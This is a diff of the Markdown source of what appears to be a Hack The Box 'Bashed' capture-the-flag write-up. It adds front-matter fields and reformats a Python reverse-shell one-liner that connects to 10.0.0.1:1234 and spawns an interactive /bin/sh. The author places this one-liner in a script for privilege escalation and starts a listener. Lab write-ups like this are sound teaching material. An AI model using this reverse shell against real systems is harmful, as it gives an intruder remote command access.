@@ -1,7 +1,8 @@
 ---
 title:     "Hack The Box - Bashed"
 tags: [linux,easy,sudo,cron]
-categories: HackTheBox
+layout: post
+categories: HackTheBox OSCP-Like
 ---
 
 ![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-bashed/1.png)
@@ -108,8 +109,9 @@ I edited the script
  
 ![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-bashed/9.png)
 
-`` python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ``
-
+```py
+ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
 Started my listener on my machine
 
 ![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-bashed/10.png)
